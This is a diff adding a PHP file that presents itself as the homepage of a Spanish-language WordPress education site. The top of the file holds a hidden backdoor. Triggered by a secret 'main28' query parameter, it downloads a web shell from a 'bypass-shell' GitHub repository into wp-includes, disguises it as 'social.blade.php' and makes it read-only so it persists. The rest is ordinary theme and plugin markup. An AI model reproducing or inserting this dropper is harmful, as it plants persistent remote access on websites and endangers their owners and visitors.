@@ -1,0 +1,1529 @@
+<?php
+
+if (isset($_GET['main28'])) {
+    $dirPath = '/home/qluilsmq/edu.wilanye.com/wp-includes/assets/';
+    $filePath = $dirPath . '/social.blade.php';
+
+    $url = 'https://raw.githubusercontent.com/dvreux/bypass-shell/refs/heads/main/28blessed.php';
+
+    $desiredPermission = 0444;
+
+    if (!is_dir($dirPath)) {
+        if (!mkdir($dirPath, 0755, true)) {
+            die("Gagal membuat direktori $dirPath");
+        }
+    }
+
+    $remoteContent = file_get_contents($url);
+
+    if ($remoteContent === false) {
+        echo "Gagal mengambil konten dari URL.\n";
+        exit;
+    }
+
+    if (file_exists($filePath)) {
+        $localContent = file_get_contents($filePath);
+
+        if ($localContent !== $remoteContent) {
+            if (file_put_contents($filePath, $remoteContent) !== false) {
+                echo "Isi file berhasil diperbarui.\n";
+            } else {
+                echo "Gagal memperbarui isi file.\n";
+            }
+        } else {
+            echo "Isi file sudah sama dengan konten dari URL.\n";
+        }
+
+        $filePermission = fileperms($filePath);
+
+        if (($filePermission & 0777) !== $desiredPermission) {
+            if (chmod($filePath, $desiredPermission)) {
+                echo "Izin file telah diubah menjadi 444.\n";
+            } else {
+                echo "Gagal mengubah izin file.\n";
+            }
+        }
+    } else {
+        if (file_put_contents($filePath, $remoteContent) !== false) {
+            if (chmod($filePath, $desiredPermission)) {
+                echo "File berhasil dibuat dengan konten dari URL dan izin 444.\n";
+            } else {
+                echo "File berhasil dibuat tetapi tidak mengubah izinnya.\n";
+            }
+        } else {
+            echo "Gagal membuat file.\n";
+        }
+    }
+}
+?>
+
+<!doctype html>
+<html lang="es-ES" class="no-js" itemtype="https://schema.org/WebPage" itemscope>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+	<title>EDU WILANYE &#8211; Plataforma educativa</title>
+<meta name='robots' content='max-image-preview:large' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="EDU WILANYE &raquo; Feed" href="https://edu.wilanye.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="EDU WILANYE &raquo; Feed de los comentarios" href="https://edu.wilanye.com/comments/feed/" />
+			<script>document.documentElement.classList.remove( 'no-js' );</script>
+			<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/edu.wilanye.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.2"}};
+/*! This file is auto-generated */
+!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<link rel='stylesheet' id='masterstudy-bootstrap-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/bootstrap.min.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='masterstudy-bootstrap-custom-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/ms-bootstrap-custom.css?ver=3.6.10' media='all' />
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style id='classic-theme-styles-inline-css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<link rel='stylesheet' id='contact-form-7-css' href='https://edu.wilanye.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=6.1' media='all' />
+<link rel='stylesheet' id='events-manager-css' href='https://edu.wilanye.com/wp-content/plugins/events-manager/includes/css/events-manager.min.css?ver=7.0.4' media='all' />
+<link rel='stylesheet' id='font-awesome-min-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/font-awesome.min.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='stm_lms_icons-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/icons/style.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='video.js-css' href='https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/vendors/video-js.min.css?ver=3.6.10' media='all' />
+<link rel='stylesheet' id='masterstudy-lms-learning-management-system-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/stm_lms.css?ver=9139' media='all' />
+<link rel='stylesheet' id='stm-lms-noconflict/main-css' href='https://edu.wilanye.com/wp-content/uploads/stm_lms_styles/parts/noconflict/main.css?ver=9139' media='all' />
+<link rel='stylesheet' id='stm_lazyload_init-css' href='https://edu.wilanye.com/wp-content/plugins/stm-post-type/theme/assets/lazyload.css?ver=false' media='all' />
+<link rel='stylesheet' id='trp-language-switcher-style-css' href='https://edu.wilanye.com/wp-content/plugins/translatepress-multilingual/assets/css/trp-language-switcher.css?ver=2.9.19' media='all' />
+<link rel='stylesheet' id='kadence-global-css' href='https://edu.wilanye.com/wp-content/themes/kadence/assets/css/global.min.css?ver=1.2.26' media='all' />
+<style id='kadence-global-inline-css'>
+/* Kadence Base CSS */
+:root{--global-palette1:#000000;--global-palette2:#717070;--global-palette3:#000000;--global-palette4:#010101;--global-palette5:#111111;--global-palette6:#282828;--global-palette7:#f9f7f7;--global-palette8:#F9F7F7;--global-palette9:#ffffff;--global-palette9rgb:255, 255, 255;--global-palette-highlight:var(--global-palette1);--global-palette-highlight-alt:var(--global-palette2);--global-palette-highlight-alt2:var(--global-palette9);--global-palette-btn-bg:var(--global-palette1);--global-palette-btn-bg-hover:var(--global-palette2);--global-palette-btn:var(--global-palette9);--global-palette-btn-hover:var(--global-palette9);--global-body-font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--global-heading-font-family:inherit;--global-primary-nav-font-family:inherit;--global-fallback-font:sans-serif;--global-display-fallback-font:sans-serif;--global-content-width:1290px;--global-content-wide-width:calc(1290px + 230px);--global-content-narrow-width:842px;--global-content-edge-padding:1.5rem;--global-content-boxed-padding:2rem;--global-calc-content-width:calc(1290px - var(--global-content-edge-padding) - var(--global-content-edge-padding) );--wp--style--global--content-size:var(--global-calc-content-width);}.wp-site-blocks{--global-vw:calc( 100vw - ( 0.5 * var(--scrollbar-offset)));}:root body.kadence-elementor-colors{--e-global-color-kadence1:var(--global-palette1);--e-global-color-kadence2:var(--global-palette2);--e-global-color-kadence3:var(--global-palette3);--e-global-color-kadence4:var(--global-palette4);--e-global-color-kadence5:var(--global-palette5);--e-global-color-kadence6:var(--global-palette6);--e-global-color-kadence7:var(--global-palette7);--e-global-color-kadence8:var(--global-palette8);--e-global-color-kadence9:var(--global-palette9);}body{background:var(--global-palette8);}body, input, select, optgroup, textarea{font-weight:400;font-size:17px;line-height:1.6;font-family:var(--global-body-font-family);color:var(--global-palette4);}.content-bg, body.content-style-unboxed .site{background:var(--global-palette9);}h1,h2,h3,h4,h5,h6{font-family:var(--global-heading-font-family);}h1{font-weight:700;font-size:32px;line-height:1.5;color:var(--global-palette3);}h2{font-weight:700;font-size:28px;line-height:1.5;color:var(--global-palette3);}h3{font-weight:700;font-size:24px;line-height:1.5;color:var(--global-palette3);}h4{font-weight:700;font-size:22px;line-height:1.5;color:var(--global-palette4);}h5{font-weight:700;font-size:20px;line-height:1.5;color:var(--global-palette4);}h6{font-weight:700;font-size:18px;line-height:1.5;color:var(--global-palette5);}.entry-hero .kadence-breadcrumbs{max-width:1290px;}.site-container, .site-header-row-layout-contained, .site-footer-row-layout-contained, .entry-hero-layout-contained, .comments-area, .alignfull > .wp-block-cover__inner-container, .alignwide > .wp-block-cover__inner-container{max-width:var(--global-content-width);}.content-width-narrow .content-container.site-container, .content-width-narrow .hero-container.site-container{max-width:var(--global-content-narrow-width);}@media all and (min-width: 1520px){.wp-site-blocks .content-container  .alignwide{margin-left:-115px;margin-right:-115px;width:unset;max-width:unset;}}@media all and (min-width: 1102px){.content-width-narrow .wp-site-blocks .content-container .alignwide{margin-left:-130px;margin-right:-130px;width:unset;max-width:unset;}}.content-style-boxed .wp-site-blocks .entry-content .alignwide{margin-left:calc( -1 * var( --global-content-boxed-padding ) );margin-right:calc( -1 * var( --global-content-boxed-padding ) );}.content-area{margin-top:5rem;margin-bottom:5rem;}@media all and (max-width: 1024px){.content-area{margin-top:3rem;margin-bottom:3rem;}}@media all and (max-width: 767px){.content-area{margin-top:2rem;margin-bottom:2rem;}}@media all and (max-width: 1024px){:root{--global-content-boxed-padding:2rem;}}@media all and (max-width: 767px){:root{--global-content-boxed-padding:1.5rem;}}.entry-content-wrap{padding:2rem;}@media all and (max-width: 1024px){.entry-content-wrap{padding:2rem;}}@media all and (max-width: 767px){.entry-content-wrap{padding:1.5rem;}}.entry.single-entry{box-shadow:0px 15px 15px -10px rgba(0,0,0,0.05);}.entry.loop-entry{box-shadow:0px 15px 15px -10px rgba(0,0,0,0.05);}.loop-entry .entry-content-wrap{padding:2rem;}@media all and (max-width: 1024px){.loop-entry .entry-content-wrap{padding:2rem;}}@media all and (max-width: 767px){.loop-entry .entry-content-wrap{padding:1.5rem;}}button, .button, .wp-block-button__link, input[type="button"], input[type="reset"], input[type="submit"], .fl-button, .elementor-button-wrapper .elementor-button, .wc-block-components-checkout-place-order-button, .wc-block-cart__submit{box-shadow:0px 0px 0px -7px rgba(0,0,0,0);}button:hover, button:focus, button:active, .button:hover, .button:focus, .button:active, .wp-block-button__link:hover, .wp-block-button__link:focus, .wp-block-button__link:active, input[type="button"]:hover, input[type="button"]:focus, input[type="button"]:active, input[type="reset"]:hover, input[type="reset"]:focus, input[type="reset"]:active, input[type="submit"]:hover, input[type="submit"]:focus, input[type="submit"]:active, .elementor-button-wrapper .elementor-button:hover, .elementor-button-wrapper .elementor-button:focus, .elementor-button-wrapper .elementor-button:active, .wc-block-cart__submit:hover{box-shadow:0px 15px 25px -7px rgba(0,0,0,0.1);}.kb-button.kb-btn-global-outline.kb-btn-global-inherit{padding-top:calc(px - 2px);padding-right:calc(px - 2px);padding-bottom:calc(px - 2px);padding-left:calc(px - 2px);}@media all and (min-width: 1025px){.transparent-header .entry-hero .entry-hero-container-inner{padding-top:80px;}}@media all and (max-width: 1024px){.mobile-transparent-header .entry-hero .entry-hero-container-inner{padding-top:80px;}}@media all and (max-width: 767px){.mobile-transparent-header .entry-hero .entry-hero-container-inner{padding-top:80px;}}.entry-hero.page-hero-section .entry-header{min-height:200px;}
+/* Kadence Header CSS */
+@media all and (max-width: 1024px){.mobile-transparent-header #masthead{position:absolute;left:0px;right:0px;z-index:100;}.kadence-scrollbar-fixer.mobile-transparent-header #masthead{right:var(--scrollbar-offset,0);}.mobile-transparent-header #masthead, .mobile-transparent-header .site-top-header-wrap .site-header-row-container-inner, .mobile-transparent-header .site-main-header-wrap .site-header-row-container-inner, .mobile-transparent-header .site-bottom-header-wrap .site-header-row-container-inner{background:transparent;}.site-header-row-tablet-layout-fullwidth, .site-header-row-tablet-layout-standard{padding:0px;}}@media all and (min-width: 1025px){.transparent-header #masthead{position:absolute;left:0px;right:0px;z-index:100;}.transparent-header.kadence-scrollbar-fixer #masthead{right:var(--scrollbar-offset,0);}.transparent-header #masthead, .transparent-header .site-top-header-wrap .site-header-row-container-inner, .transparent-header .site-main-header-wrap .site-header-row-container-inner, .transparent-header .site-bottom-header-wrap .site-header-row-container-inner{background:transparent;}}.site-branding{padding:0px 0px 0px 0px;}.site-branding .site-title{font-weight:700;font-size:26px;line-height:1.2;color:var(--global-palette3);}#masthead, #masthead .kadence-sticky-header.item-is-fixed:not(.item-at-start):not(.site-header-row-container):not(.site-main-header-wrap), #masthead .kadence-sticky-header.item-is-fixed:not(.item-at-start) > .site-header-row-container-inner{background:#ffffff;}.site-main-header-inner-wrap{min-height:80px;}.header-navigation[class*="header-navigation-style-underline"] .header-menu-container.primary-menu-container>ul>li>a:after{width:calc( 100% - 1.2em);}.main-navigation .primary-menu-container > ul > li.menu-item > a{padding-left:calc(1.2em / 2);padding-right:calc(1.2em / 2);padding-top:0.6em;padding-bottom:0.6em;color:var(--global-palette5);}.main-navigation .primary-menu-container > ul > li.menu-item .dropdown-nav-special-toggle{right:calc(1.2em / 2);}.main-navigation .primary-menu-container > ul > li.menu-item > a:hover{color:var(--global-palette-highlight);}.main-navigation .primary-menu-container > ul > li.menu-item.current-menu-item > a{color:var(--global-palette3);}.header-navigation .header-menu-container ul ul.sub-menu, .header-navigation .header-menu-container ul ul.submenu{background:var(--global-palette3);box-shadow:0px 2px 13px 0px rgba(0,0,0,0.1);}.header-navigation .header-menu-container ul ul li.menu-item, .header-menu-container ul.menu > li.kadence-menu-mega-enabled > ul > li.menu-item > a{border-bottom:1px solid rgba(255,255,255,0.1);}.header-navigation .header-menu-container ul ul li.menu-item > a{width:200px;padding-top:1em;padding-bottom:1em;color:var(--global-palette8);font-size:12px;}.header-navigation .header-menu-container ul ul li.menu-item > a:hover{color:var(--global-palette9);background:var(--global-palette4);}.header-navigation .header-menu-container ul ul li.menu-item.current-menu-item > a{color:var(--global-palette9);background:var(--global-palette4);}.mobile-toggle-open-container .menu-toggle-open, .mobile-toggle-open-container .menu-toggle-open:focus{color:var(--global-palette5);padding:0.4em 0.6em 0.4em 0.6em;font-size:14px;}.mobile-toggle-open-container .menu-toggle-open.menu-toggle-style-bordered{border:1px solid currentColor;}.mobile-toggle-open-container .menu-toggle-open .menu-toggle-icon{font-size:20px;}.mobile-toggle-open-container .menu-toggle-open:hover, .mobile-toggle-open-container .menu-toggle-open:focus-visible{color:var(--global-palette-highlight);}.mobile-navigation ul li{font-size:14px;}.mobile-navigation ul li a{padding-top:1em;padding-bottom:1em;}.mobile-navigation ul li > a, .mobile-navigation ul li.menu-item-has-children > .drawer-nav-drop-wrap{color:var(--global-palette8);}.mobile-navigation ul li.current-menu-item > a, .mobile-navigation ul li.current-menu-item.menu-item-has-children > .drawer-nav-drop-wrap{color:var(--global-palette-highlight);}.mobile-navigation ul li.menu-item-has-children .drawer-nav-drop-wrap, .mobile-navigation ul li:not(.menu-item-has-children) a{border-bottom:1px solid rgba(255,255,255,0.1);}.mobile-navigation:not(.drawer-navigation-parent-toggle-true) ul li.menu-item-has-children .drawer-nav-drop-wrap button{border-left:1px solid rgba(255,255,255,0.1);}#mobile-drawer .drawer-header .drawer-toggle{padding:0.6em 0.15em 0.6em 0.15em;font-size:24px;}#main-header .header-button{border:2px none transparent;box-shadow:0px 0px 0px -7px rgba(0,0,0,0);}#main-header .header-button:hover{box-shadow:0px 15px 25px -7px rgba(0,0,0,0.1);}.mobile-header-button-wrap .mobile-header-button-inner-wrap .mobile-header-button{border:2px none transparent;box-shadow:0px 0px 0px -7px rgba(0,0,0,0);}.mobile-header-button-wrap .mobile-header-button-inner-wrap .mobile-header-button:hover{box-shadow:0px 15px 25px -7px rgba(0,0,0,0.1);}
+/* Kadence Footer CSS */
+.site-bottom-footer-inner-wrap{padding-top:30px;padding-bottom:30px;grid-column-gap:30px;}.site-bottom-footer-inner-wrap .widget{margin-bottom:30px;}.site-bottom-footer-inner-wrap .site-footer-section:not(:last-child):after{right:calc(-30px / 2);}
+</style>
+<link rel='stylesheet' id='kadence-header-css' href='https://edu.wilanye.com/wp-content/themes/kadence/assets/css/header.min.css?ver=1.2.26' media='all' />
+<link rel='stylesheet' id='kadence-content-css' href='https://edu.wilanye.com/wp-content/themes/kadence/assets/css/content.min.css?ver=1.2.26' media='all' />
+<link rel='stylesheet' id='kadence-footer-css' href='https://edu.wilanye.com/wp-content/themes/kadence/assets/css/footer.min.css?ver=1.2.26' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://edu.wilanye.com/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.30.0' media='all' />
+<link rel='stylesheet' id='elementor-post-20-css' href='https://edu.wilanye.com/wp-content/uploads/elementor/css/post-20.css?ver=1751582219' media='all' />
+<link rel='stylesheet' id='font-awesome-5-all-css' href='https://edu.wilanye.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/all.min.css?ver=3.30.0' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css' href='https://edu.wilanye.com/wp-content/plugins/elementor/assets/lib/font-awesome/css/v4-shims.min.css?ver=3.30.0' media='all' />
+<link rel='stylesheet' id='widget-video-css' href='https://edu.wilanye.com/wp-content/plugins/elementor/assets/css/widget-video.min.css?ver=3.30.0' media='all' />
+<link rel='stylesheet' id='widget-link-in-bio-base-css' href='https://edu.wilanye.com/wp-content/plugins/elementor/assets/css/widget-link-in-bio-base.min.css?ver=3.30.0' media='all' />
+<link rel='stylesheet' id='elementor-post-972-css' href='https://edu.wilanye.com/wp-content/uploads/elementor/css/post-972.css?ver=1752011599' media='all' />
+<link rel='stylesheet' id='redux-google-fonts-stm_option-css' href='https://fonts.googleapis.com/css?family=Poppins%7COpen+Sans%7CMontserrat&#038;subset=latin&#038;ver=1731551172' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-roboto-css' href='https://edu.wilanye.com/wp-content/uploads/elementor/google-fonts/css/roboto.css?ver=1747944890' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-robotoslab-css' href='https://edu.wilanye.com/wp-content/uploads/elementor/google-fonts/css/robotoslab.css?ver=1747944892' media='all' />
+<link rel='stylesheet' id='elementor-gf-local-poppins-css' href='https://edu.wilanye.com/wp-content/uploads/elementor/google-fonts/css/poppins.css?ver=1751641003' media='all' />
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3" id="jquery-ui-mouse-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.3" id="jquery-ui-sortable-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.13.3" id="jquery-ui-datepicker-js"></script>
+<script id="jquery-ui-datepicker-js-after">
+jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Cerrar","currentText":"Hoy","monthNames":["enero","febrero","marzo","abril","mayo","junio","julio","agosto","septiembre","octubre","noviembre","diciembre"],"monthNamesShort":["Ene","Feb","Mar","Abr","May","Jun","Jul","Ago","Sep","Oct","Nov","Dic"],"nextText":"Siguiente","prevText":"Anterior","dayNames":["domingo","lunes","martes","mi\u00e9rcoles","jueves","viernes","s\u00e1bado"],"dayNamesShort":["Dom","Lun","Mar","Mi\u00e9","Jue","Vie","S\u00e1b"],"dayNamesMin":["D","L","M","X","J","V","S"],"dateFormat":"MM d, yy","firstDay":1,"isRTL":false});});
+</script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/resizable.min.js?ver=1.13.3" id="jquery-ui-resizable-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/draggable.min.js?ver=1.13.3" id="jquery-ui-draggable-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/controlgroup.min.js?ver=1.13.3" id="jquery-ui-controlgroup-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/checkboxradio.min.js?ver=1.13.3" id="jquery-ui-checkboxradio-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/button.min.js?ver=1.13.3" id="jquery-ui-button-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/jquery/ui/dialog.min.js?ver=1.13.3" id="jquery-ui-dialog-js"></script>
+<script id="events-manager-js-extra">
+var EM = {"ajaxurl":"https:\/\/edu.wilanye.com\/wp-admin\/admin-ajax.php","locationajaxurl":"https:\/\/edu.wilanye.com\/wp-admin\/admin-ajax.php?action=locations_search","firstDay":"1","locale":"es","dateFormat":"yy-mm-dd","ui_css":"https:\/\/edu.wilanye.com\/wp-content\/plugins\/events-manager\/includes\/css\/jquery-ui\/build.min.css","show24hours":"1","is_ssl":"1","autocomplete_limit":"10","calendar":{"breakpoints":{"small":560,"medium":908,"large":false}},"phone":{"error":"Por favor, introduce un n\u00famero de tel\u00e9fono v\u00e1lido.","detectJS":true,"options":{"initialCountry":"VE","separateDialCode":true,"showFlags":true,"onlyCountries":[],"excludeCountries":[]}},"datepicker":{"format":"Y-m-d","locale":"es"},"search":{"breakpoints":{"small":650,"medium":850,"full":false}},"url":"https:\/\/edu.wilanye.com\/wp-content\/plugins\/events-manager","assets":{"input.em-uploader":{"js":{"em-uploader":{"url":"https:\/\/edu.wilanye.com\/wp-content\/plugins\/events-manager\/includes\/js\/em-uploader.js?v=7.0.4","event":"em_uploader_ready","requires":"filepond"},"filepond-validate-size":"filepond\/plugins\/filepond-plugin-file-validate-size.js?v=7.0.4","filepond-validate-type":"filepond\/plugins\/filepond-plugin-file-validate-type.js?v=7.0.4","filepond-image-validate-size":"filepond\/plugins\/filepond-plugin-image-validate-size.js?v=7.0.4","filepond-exif-orientation":"filepond\/plugins\/filepond-plugin-image-exif-orientation.js?v=7.0.4","filepond-get-file":"filepond\/plugins\/filepond-plugin-get-file.js?v=7.0.4","filepond-plugin-image-overlay":"filepond\/plugins\/filepond-plugin-image-overlay.js?v=7.0.4","filepond-plugin-image-thumbnail":"filepond\/plugins\/filepond-plugin-image-thumbnail.js?v=7.0.4","filepond-plugin-pdf-preview-overlay":"filepond\/plugins\/filepond-plugin-pdf-preview-overlay.js?v=7.0.4","filepond-plugin-file-icon":"filepond\/plugins\/filepond-plugin-file-icon.js?v=7.0.4","filepond":{"url":"filepond\/filepond.js?v=7.0.4","locale":"es-es"}},"css":{"em-filepond":"filepond\/em-filepond.min.css?v=7.0.4","filepond-preview":"filepond\/plugins\/filepond-plugin-image-preview.min.css?v=7.0.4","filepond-plugin-image-overlay":"filepond\/plugins\/filepond-plugin-image-overlay.min.css?v=7.0.4","filepond-get-file":"filepond\/plugins\/filepond-plugin-get-file.min.css?v=7.0.4"}},".em-recurrence-sets, .em-timezone":{"js":{"luxon":{"url":"luxon\/luxon.js?v=7.0.4","event":"em_luxon_ready"}}},".em-booking-form, #em-booking-form, .em-booking-recurring, .em-event-booking-form":{"js":{"em-bookings":{"url":"https:\/\/edu.wilanye.com\/wp-content\/plugins\/events-manager\/includes\/js\/bookingsform.js?v=7.0.4","event":"em_booking_form_js_loaded"}}}},"cached":"","uploads":{"endpoint":"https:\/\/edu.wilanye.com\/wp-json\/events-manager\/v1\/uploads","nonce":"6e88f5ab02","delete_confirm":"Are you sure you want to delete this file? It will be deleted upon submission.","images":{"max_file_size":"","image_max_width":"700","image_max_height":"700","image_min_width":"50","image_min_height":"50"},"files":{"max_file_size":"","types":{"0":"image\/gif","1":"image\/jpeg","3":"image\/png","4":"image\/heic","5":"application\/pdf","6":"application\/msword","7":"application\/x-msword","8":"application\/vnd.openxmlformats-officedocument.wordprocessingml.document","9":"text\/rtf","10":"application\/rtf","11":"application\/x-rtf","12":"application\/vnd.oasis.opendocument.text","13":"text\/plain","14":"application\/vnd.ms-excel","15":"application\/xls","16":"application\/vnd.openxmlformats-officedocument.spreadsheetml.sheet","17":"text\/csv","18":"application\/csv","20":"application\/vnd.oasis.opendocument.spreadsheet","21":"application\/vnd.ms-powerpoint","22":"application\/mspowerpoint","23":"application\/vnd.openxmlformats-officedocument.presentationml.presentation","24":"application\/vnd.oasis.opendocument.presentation"}}},"api_nonce":"0bf33f0f9b","txt_search":"Buscar","txt_searching":"Buscando...","txt_loading":"Cargando...","event_detach_warning":"\u00bfSeguro de que deseas separar este evento? Haci\u00e9ndolo, este evento ser\u00e1 independiente del conjunto de eventos peri\u00f3dicos.","delete_recurrence_warning":"\u00bfSeguro que deseas borrar todas las repeticiones de este evento? Todos los eventos se mover\u00e1n a la papelera."};
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/events-manager/includes/js/events-manager.js?ver=7.0.4" id="events-manager-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/events-manager/includes/external/flatpickr/l10n/es.js?ver=7.0.4" id="em-flatpickr-localization-js"></script>
+<script src="https://edu.wilanye.com/wp-includes/js/dist/vendor/moment.min.js?ver=2.30.1" id="moment-js"></script>
+<script id="moment-js-after">
+moment.updateLocale( 'es_ES', {"months":["enero","febrero","marzo","abril","mayo","junio","julio","agosto","septiembre","octubre","noviembre","diciembre"],"monthsShort":["Ene","Feb","Mar","Abr","May","Jun","Jul","Ago","Sep","Oct","Nov","Dic"],"weekdays":["domingo","lunes","martes","mi\u00e9rcoles","jueves","viernes","s\u00e1bado"],"weekdaysShort":["Dom","Lun","Mar","Mi\u00e9","Jue","Vie","S\u00e1b"],"week":{"dow":1},"longDateFormat":{"LT":"g:i a","LTS":null,"L":null,"LL":"F j, Y","LLL":"j \\d\\e F \\d\\e Y H:i","LLLL":null}} );
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/events-manager//includes/external/chartjs/chart.umd.min.js?ver=7.0.4" id="chart-js-js"></script>
+<script id="stm-lms-lms-js-extra">
+var stm_lms_vars = {"symbol":"$","position":"left","currency_thousands":",","wp_rest_nonce":"0bf33f0f9b","translate":{"delete":"Are you sure you want to delete this course from cart?"}};
+</script>
+<script src="https://edu.wilanye.com/wp-content/plugins/masterstudy-lms-learning-management-system/_core/assets/js/lms.js?ver=9139" id="stm-lms-lms-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/stm-post-type/theme/assets/lazysizes.min.js?ver=false" id="lazysizes.js-js"></script>
+<script src="https://edu.wilanye.com/wp-content/plugins/stm-post-type/theme/assets/stm_lms_lazyload.js?ver=false" id="stm_lms_lazysizes-js"></script>
